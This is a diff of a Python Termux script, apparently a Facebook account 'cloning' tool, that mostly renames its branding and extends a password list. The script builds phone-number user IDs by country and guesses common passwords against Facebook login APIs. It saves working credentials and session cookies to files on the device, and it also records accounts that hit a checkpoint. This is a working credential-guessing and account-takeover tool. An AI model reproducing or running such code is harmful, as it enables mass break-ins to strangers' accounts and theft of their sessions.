@@ -81,7 +81,7 @@ loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 #__________________| LINE |__________________#
 def clear():os.system('clear');print(logo)
-def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 import random
 
 def ua_api():
@@ -97,21 +97,24 @@ def ua_api():
 
 #__________________| LOGO |__________________#
 logo=(f"""
- \033[1;32m db   db  .d8b.  d888888b .d8888. 
- \033[1;32m 88   88 d8' `8b `~~88~~' 88'  YP 
- \033[1;32m 88ooo88 88ooo88    88    `8bo.   
- \033[1;32m 88~~~88 88~~~88    88      `Y8b. 
- \033[1;32m 88   88 88   88    88    db   8D 
- \033[1;32m YP   YP YP   YP    YP    `8888Y'                                                                  
+\033[1;30m
+\033[1;30m888b    888        d8888 8888888b.  8888888888 8888888888 888b     d888 
+\033[1;31m8888b   888       d88888 888  "Y88b 888        888        8888b   d8888 
+\033[1;32m88888b  888      d88P888 888    888 888        888        88888b.d88888 
+\033[1;33m888Y88b 888     d88P 888 888    888 8888888    8888888    888Y88888P888 
+\033[1;34m888 Y88b888    d88P  888 888    888 888        888        888 Y888P 888 
+\033[1;35m888  Y88888   d88P   888 888    888 888        888        888  Y8P  888 
+\033[1;36m888   Y8888  d8888888888 888  .d88P 888        888        888   "   888 
+\033[1;37m888    Y888 d88P     888 8888888P"  8888888888 8888888888 888       888 
 
-\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : Bikash × Samir
-\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/HATS-777 
+\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR   : BROKEN-NADIM
+\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB     : NADEEM-HERE
 \033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : Bikash Magar
-\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35mTril
-\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+\033[1;32m[\033[1;31m✓\033[1;32m] TOOL TYPES : \033[1;33mmFILE-RANDOM
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35mTRIL BROKEM
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________| MAIN |__________________#
 def clear():
 	os.system('clear')
@@ -122,7 +125,7 @@ def menu():
         try:
               #  approval()
                         clear()
-                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL OWNER\n{G}[{A}0{G}]{G} EXIT TOOL')
+                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL NADEEM\n{G}[{A}0{G}]{G} EXIT TERMUX TOOL')
                         linex()
                         xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                         if xd in ['1','01']:
@@ -208,11 +211,11 @@ def menu():
 def randm():
     clear()
     print(f'{G}[{A}1{G}]{G} BANGLADESH CLONING ')
-    print(f'{G}[{A}2{G}]{G} INDIA CLONING ')
-    print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
+    print(f'{G}[{A}2{G}]{G} INDIA CLONING✅ ')
+    print(f'{G}[{A}3{G}]{G} NEPAL CLONING✅ ')
     print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
     print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONING ')
-    print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
+    print(f'{G}[{A}0{G}]{G} BACK TO MENU ✅ ');linex()
     option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
     if option in ['1','A']:
         bd()
@@ -289,7 +292,7 @@ def india():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [psx,uid[:8],'57273200','59039200','57575751']
+				passlist = [psx,uid[:8],'57273200','59039200','57575751','123456','1234567']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -308,7 +311,7 @@ def india():
 def nepal():
 		user=[]
 		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
+		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 [-CHOOSE CODE-] ');linex()
 		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
@@ -361,7 +364,7 @@ def pakistan():
 			tl = str(len(user))
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
+			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE USSE');linex()
 			for psx in user:
 				uid = code+psx
 				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
@@ -511,10 +514,10 @@ def api1(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}[-HATS-OKY-]{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/HATS-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NADEEM-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -615,16 +618,16 @@ def api2(ids,names,passlist):
                         url = 'https://b-api.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}[-NADEEM-OKY-]{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/HATS-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NADEEM-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HATS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}[-NADEEM-CPP-]{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/[-NADEEM-CPP-].txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -716,16 +719,16 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}NADEEM-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/HATS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NADEEM-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HATS-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}[-NADEEM-CPY-]{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/[-NADEEM-CPY-].txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -815,16 +818,16 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}NADEEM-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/HATS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NADEEM-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HATS-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}[NADEEM-CPY-]{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/[-NADEEM-CPY-].txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -914,16 +917,16 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}HATS-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}[-NADEEM-OKY-]{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/HATS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/NADEEM-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HATS-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}NADEEM-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NADEEM-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
